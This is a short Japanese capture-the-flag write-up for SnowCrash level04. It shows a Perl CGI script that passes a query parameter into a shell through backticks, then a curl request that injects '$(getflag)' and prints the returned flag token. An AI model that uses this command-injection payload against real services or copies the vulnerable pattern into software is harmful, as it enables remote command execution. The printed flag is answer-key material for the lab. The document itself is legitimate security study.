##　perlスクリプトの内容を確認
```sh
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## エクスプロイト
- `localhost:4747`でクエリパラメータを受け付けている。
- `x(param("x"));`でクエリパラメータの`x`をの値を`echo`で出力している。

これらを利用して、クエリパラメータ`x`に`$(getflag)`を設定し`echo`で`getflag`をコマンド置換する。

## リクエストの送信
```sh
level04@SnowCrash:~$ curl 'http://localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```